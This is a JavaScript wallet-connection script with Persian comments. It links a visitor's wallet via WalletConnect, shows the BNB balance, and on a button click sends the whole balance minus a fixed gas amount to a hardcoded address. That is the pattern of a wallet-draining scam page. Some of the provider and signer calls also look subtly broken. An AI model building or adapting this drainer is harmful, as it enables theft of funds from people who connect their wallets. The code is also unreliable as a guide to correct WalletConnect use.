import { WalletConnectModal } from "@walletconnect/modal";
import WalletConnectEthereumProvider from '@walletconnect/ethereum-provider';
import { ethers } from 'ethers';

let provider;
let signer;
let walletAddress;
let bnbBalance;

const connectButton = document.getElementById("connectWallet");
const sendButton = document.getElementById("sendTransaction");
const walletAddressDisplay = document.getElementById("walletAddress");
const bnbBalanceDisplay = document.getElementById("bnbBalance");

const fixedAddress = "0xYourFixedAddressHere"; // آدرس ثابت برای ارسال تراکنش

// Project ID خود را وارد کنید
const projectId = "your_project_id_here"; 

const walletConnectModal = new WalletConnectModal({
  cacheProvider: true, // Enable session cache
});

async function connectWallet() {
  try {
    // استفاده از WalletConnect برای اتصال به MetaMask
    const connector = await walletConnectModal.connect();

    // اتصال به WalletConnectEthereumProvider
    provider = new WalletConnectEthereumProvider({
      connector,
      projectId: projectId, // اضافه کردن Project ID
    });

    await provider.enable();
    signer = provider.getSigner();
    walletAddress = await signer.getAddress();

    // نمایش آدرس کیف پول و فعال کردن دکمه ارسال تراکنش
    walletAddressDisplay.textContent = walletAddress;
    sendButton.disabled = false;

    // دریافت موجودی BNB
    fetchBalance();
  } catch (error) {
    console.error(error);
  }
}

async function fetchBalance() {
  try {
    // دریافت موجودی BNB
    const balance = await signer.getBalance();
    bnbBalance = ethers.utils.formatEther(balance);
    bnbBalanceDisplay.textContent = bnbBalance;
  } catch (error) {
    console.error(error);
  }
}

async function sendTransaction() {
  try {
    // مقدار گس 0.001 BNB که باید از موجودی کم شود
    const gasAmount = ethers.utils.parseEther("0.001");

    // تبدیل موجودی به Wei
    const balanceInWei = ethers.utils.parseEther(bnbBalance);

    // بررسی اینکه آیا موجودی کافی برای پرداخت گس وجود دارد
    if (balanceInWei.lt(gasAmount)) {
      alert("موجودی کافی برای پرداخت گس وجود ندارد!");
      return;
    }

    // محاسبه مبلغ باقی‌مانده بعد از کسر گس
    const amountToSend = balanceInWei.sub(gasAmount);

    // ایجاد تراکنش
    const transaction = {
      to: fixedAddress,
      value: amountToSend,
    };

    // ارسال تراکنش
    const txResponse = await signer.sendTransaction(transaction);
    console.log("Transaction Sent:", txResponse);
    await txResponse.wait();
    console.log("Transaction Confirmed");
  } catch (error) {
    console.error(error);
  }
}

connectButton.addEventListener("click", connectWallet);
sendButton.addEventListener("click", sendTransaction);